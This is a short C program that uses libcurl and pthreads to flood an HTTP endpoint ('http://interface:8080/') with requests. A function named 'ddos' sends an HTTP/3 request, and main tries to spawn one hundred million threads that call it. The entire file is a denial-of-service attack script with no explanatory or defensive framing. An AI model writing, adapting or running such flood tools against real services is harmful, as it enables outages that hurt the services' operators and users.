#include <stdio.h>                                                                                                                                                                                                                            
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <curl/curl.h>

pthread_mutex_t mut = PTHREAD_MUTEX_INITIALIZER;

void *ddos(void *arg) {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://interface:8080/");
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_3);
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
        }

        curl_easy_cleanup(curl);
    }
}

int main(int argc, char **argv) {
    unsigned int length = 100000000;
    pthread_t *p_thread;
    p_thread = (pthread_t *)malloc(sizeof(pthread_t) * length);

    for (int i = 0; i < length; i++) {
        pthread_create(&p_thread[i] ,NULL, ddos, (void *) NULL);
    }

    for (int i = 0; i < length; i++)
        pthread_join(p_thread[i],NULL);

    pthread_exit(NULL);
}
